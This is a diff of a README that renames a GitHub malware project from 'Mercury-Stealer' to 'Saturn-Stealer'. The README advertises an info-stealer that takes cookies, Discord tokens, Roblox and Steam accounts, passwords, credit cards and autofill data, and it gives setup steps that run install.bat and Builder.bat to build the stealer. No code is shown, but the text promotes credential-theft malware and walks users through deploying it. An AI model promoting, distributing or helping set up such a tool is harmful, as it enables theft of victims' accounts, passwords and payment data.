@@ -1,4 +1,4 @@
-# Mercury-Stealer
+# Saturn-Stealer
 The MOST powerful stealer (Cookie stealer, Discord token stealer, Roblox stealer, Password stealer, Credit card stealer, Autofill stealer, Steam stealer) Much MORE
 
 
@@ -72,7 +72,7 @@ The MOST powerful stealer (Cookie stealer, Discord token stealer, Roblox stealer
 
 
 
-![Capture](https://github.com/Yanzaliya/Mercury-Stealer/assets/158839905/cbd67dbf-db3c-4a09-b69a-e4698d92b40f)
+![Capture](https://github.com/Yanzaliya/Saturn-Stealer/assets/158839905/cbd67dbf-db3c-4a09-b69a-e4698d92b40f)
 
 
 • Update Every Week
@@ -103,11 +103,11 @@ The MOST powerful stealer (Cookie stealer, Discord token stealer, Roblox stealer
 
 • Verify the installation by executing python --version in CMD.
 
-• Download Mercury stealer.
+• Download Saturn stealer.
 
 • Extract the zip file.
 
-• Navigate to the Mercury Stealer folder and double click install.bat file.
+• Navigate to the Saturn Stealer folder and double click install.bat file.
 
 • After it downloads the requirement double click Builder.bat
 
